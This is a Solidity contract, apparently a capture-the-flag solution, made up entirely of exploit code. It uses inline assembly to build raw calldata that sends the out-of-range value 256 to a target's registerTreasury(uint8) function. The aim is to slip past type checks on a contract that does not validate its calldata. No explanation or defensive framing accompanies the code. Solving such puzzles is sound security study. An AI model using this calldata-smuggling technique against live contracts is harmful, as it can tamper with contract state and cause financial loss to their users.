pragma solidity ^0.6.12;

contract HigherOrderAttack {
    address instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function exploit() public {
        bytes4 selector = bytes4(keccak256('registerTreasury(uint8)'));
        uint256 value = 256;
        assembly {
            let payload := mload(0x40)
            mstore(0x40, add(payload, 0x40))
            mstore(payload, selector)
            mstore(add(payload, 0x04), value)
            if iszero(call(gas, instance, 0, payload, 0x40, 0, 0)) {
                revert(0, 0)
            }
        }
    }
}